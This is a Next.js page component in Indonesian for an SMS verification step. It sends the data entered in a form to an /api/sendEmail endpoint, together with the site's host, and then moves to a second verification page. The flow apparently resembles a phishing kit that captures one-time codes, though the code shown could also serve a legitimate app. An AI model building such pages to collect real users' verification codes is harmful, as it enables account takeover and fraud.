
import { useRouter } from 'next/router'
import React, { useState } from 'react'
import SiteVerifikasi from '../../components/SiteVerifikasi'
import Inbox from '../../public/inbox.jpeg'
import Image from 'next/image'


function Verifikasi({host}) {


  const router = useRouter()
  const handleMessage = async (data) => {

    document.getElementById('btn').innerHTML = 'Loading...'
      try {

        
        const response = await fetch('/api/sendEmail', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'url': host
            },
            body: JSON.stringify(data)
        })

        const json = await response.json()
        
        if (json.status === 200) {
            document.getElementById('btn').innerHTML = 'LANJUT'
            let id = 2
            router.push({
                pathname: `/verifikasi/${id}`,
            })
        } else{
            document.getElementById('btn').innerHTML = 'LANJUT'
            console.log(json.error)
        }

      } catch (error) {
          document.getElementById('btn').innerHTML = 'LANJUT'
          console.log(error.message);
      }
  }

  return (
    <div className="container">
      <div className='container-flex'>
        <div className='bg-full-grey'>
          <div className='img-inbox'>
            <Image src={Inbox} alt="inbox"/>
          </div>
          <div className='card-pesan'>
            <SiteVerifikasi btnClick = {(data)=>handleMessage(data)}/>
          </div>
        <p style={{textAlign:'center', fontWeight:'bold', marginTop:'1em', color:'gray', fontSize:'0.8em'}}>Tidak Terima SMS? <span style={{fontWeight:'lighter'}}>Kirim Ulang</span></p>
        </div>
      </div>
    </div>
  )
}

export async function getServerSideProps(context) {

  const host = context.req.headers.host
  
  return {
    props: {
      host
    },
  }
}

export default Verifikasi